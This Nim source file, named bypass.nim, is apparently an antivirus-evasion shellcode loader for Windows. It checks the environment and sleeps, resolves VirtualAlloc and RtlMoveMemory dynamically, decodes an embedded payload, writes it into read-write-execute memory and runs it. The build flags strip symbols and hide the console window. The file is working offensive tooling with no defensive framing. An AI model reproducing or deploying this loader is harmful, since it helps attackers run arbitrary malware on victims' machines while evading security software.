# nim c -d:mingw --cpu:amd64 -d:release -d:danger --app:gui bypass.nim
{.passL: "-s".}
{.passC: "-D_FORTIFY_SOURCE=0".}

import dynlib
import winlean
import strutils
import os

include bytes

type
  virtualAllocFun = proc (lpAddress: pointer, dwSize: Natural, flAllocationType: DWORD, flProtect: DWORD): pointer {.stdcall.}
  rtlMoveMemoryFun = proc (dest: pointer, src: pointer, length: Natural) {.stdcall.}
  codeFun = proc () {.gcsafe, stdcall.}

checkEnv()
sleep(wait_time)

let kernel32 = loadLib("kernel32.dll")
let virtualAlloc = cast[virtualAllocFun](kernel32.symAddr("VirtualAlloc"))
let rtlMoveMemory = cast[rtlMoveMemoryFun](kernel32.symAddr("RtlMoveMemory"))

proc run(s : string) =
  let code = codeDecode(s)
  let code_addr = virtualAlloc(nil, len(code), 0x3000, 0x40)
  rtlMoveMemory(code_addr, code.cstring, len(code))
  let f = cast[codeFun](code_addr)
  f()

run(codes)







